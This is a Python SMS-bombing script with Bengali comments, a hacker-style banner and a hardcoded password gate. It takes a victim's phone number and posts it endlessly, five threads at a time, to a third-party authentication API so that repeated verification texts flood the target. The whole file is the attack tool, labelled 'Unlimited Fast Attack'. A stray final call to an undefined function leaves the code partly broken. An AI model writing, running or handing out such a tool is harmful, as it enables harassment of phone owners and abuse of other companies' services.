import requests
import time
import os
import signal
import threading
from requests.exceptions import RequestException

# --- স্ক্রিন ক্লিয়ার ফাংশন ---
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# --- সিগন্যাল হ্যান্ডলার (CTRL+C) ---
def signal_handler(sig, frame):
    print("\n\033[1;31m[-] টুলটি বন্ধ করা হচ্ছে... বিদায়!\033[0m")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

# --- প্রিমিয়াম ব্যানার ---
def show_banner():
    clear()
    banner = """
\033[1;36m  _    _ _    _ _   _ _______ ______ _____  
 | |  | | |  | | \ | |__   __|  ____|  __ \ 
 | |__| | |  | |  \| |  | |  | |__  | |__) |
 |  __  | |  | | . ` |  | |  |  __| |  _  / 
 | |  | | |__| | |\  |  | |  | |____| | \ \ 
 |_|  |_|\____/|_| \_|  |_|  |______|_|  \_\
                                            
      \033[1;33m>>> PREMIUM HUNTER MODE v3.0 <<<\033[0m
\033[1;32m-----------------------------------------------
 \033[1;37m[*] Developed By : \033[1;35m@saeid9.90
 \033[1;37m[*] Version      : \033[1;35mPro Unlimited
\033[1;32m-----------------------------------------------\033[0m
    """
    print(banner)

# --- পাসওয়ার্ড সুরক্ষা ---
def check_password():
    clear()
    correct_pass = "saeid9.90"
    print("\033[1;33m" + "="*45)
    print("\033[1;36m       🛡️  SECURITY CHECK - ACCESS CONTROL 🛡️")
    print("\033[1;33m" + "="*45 + "\033[0m")
    
    user_pass = input("\n\033[1;34m[?] Enter Access Password: \033[0m")
    
    if user_pass == correct_pass:
        print("\n\033[1;32m[✓] Access Granted! Welcome back Saeid.\033[0m")
        time.sleep(1.5)
        return True
    else:
        print("\n\033[1;31m[!] Wrong Password! Access Denied.\033[0m")
        exit()

# --- রিকোয়েস্ট পাঠানোর ফাংশন ---
TARGET_API = "https://api-dynamic.bloncapealive.com/v2/auth/login?country=RS&platform=web&language=es"

def send_sms(number):
    try:
        # এখানে API-এর প্রয়োজনীয় ডাটা পাঠানো হচ্ছে
        payload = {"country": "RS", "platform": "web", "language": "es", "number": number}
        response = requests.post(TARGET_API, json=payload, timeout=5)
        
        if response.status_code == 200:
            print(f"\033[1;32m[+] Success -> \033[1;37m{number}\033[0m")
        else:
            print(f"\033[1;31m[-] Failed (Code: {response.status_code})\033[0m")
    except:
        pass

# --- মেইন কন্ট্রোলার ---
def start_attack():
    check_password()
    show_banner()
    
    num = input("\033[1;34m[?] Target Number: \033[0m").strip()
    print(f"\n\033[1;33m[*] Starting Unlimited Fast Attack on: {num}")
    print("\033[1;31m[*] Press CTRL+C to Stop\n\033[0m")

    # আনলিমিটেড থ্রেডিং লুপ
    while True:
        # এক সাথে ৫টি করে থ্রেড চালু হবে (স্পিড বাড়ানোর জন্য)
        threads = []
        for _ in range(5): 
            t = threading.Thread(target=send_sms, args=(num,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join() # থ্রেডগুলো শেষ হওয়া পর্যন্ত অপেক্ষা করবে

if __name__ == "__main__":
    start_attack()

if __name__ == "__main__":
    send_continuous_requests_fast()
